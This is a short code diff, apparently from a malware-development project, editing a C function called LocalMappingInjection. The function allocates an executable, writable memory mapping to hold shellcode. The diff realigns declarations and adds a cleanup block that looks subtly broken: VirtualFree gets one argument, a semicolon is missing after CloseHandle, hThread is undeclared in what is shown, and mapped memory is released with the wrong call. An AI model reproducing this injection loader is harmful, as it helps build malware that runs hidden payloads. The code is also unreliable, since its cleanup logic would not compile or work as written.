@@ -10,9 +10,9 @@ BOOL LocalMappingInjection
 
 {
 
-	BOOL State = TRUE;
-	HANDLE hFile = NULL;
-	PVOID LocalAddress = NULL;
+	BOOL	State			= TRUE;
+	HANDLE	hFile			= NULL;
+	PVOID	LocalAddress	= NULL;
 
 
 	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sSizeofShellcode, NULL);
@@ -51,6 +51,15 @@ BOOL LocalMappingInjection
 	*pAddress = LocalAddress;
 
 CLEANUP:
+
+	if (LocalAddress)
+		VirtualFree(LocalAddress);
+
+	if (hFile)
+		CloseHandle(hFile)
+
+	if (hThread)
+		CloseHandle(hThread);
 
 	return State;
 
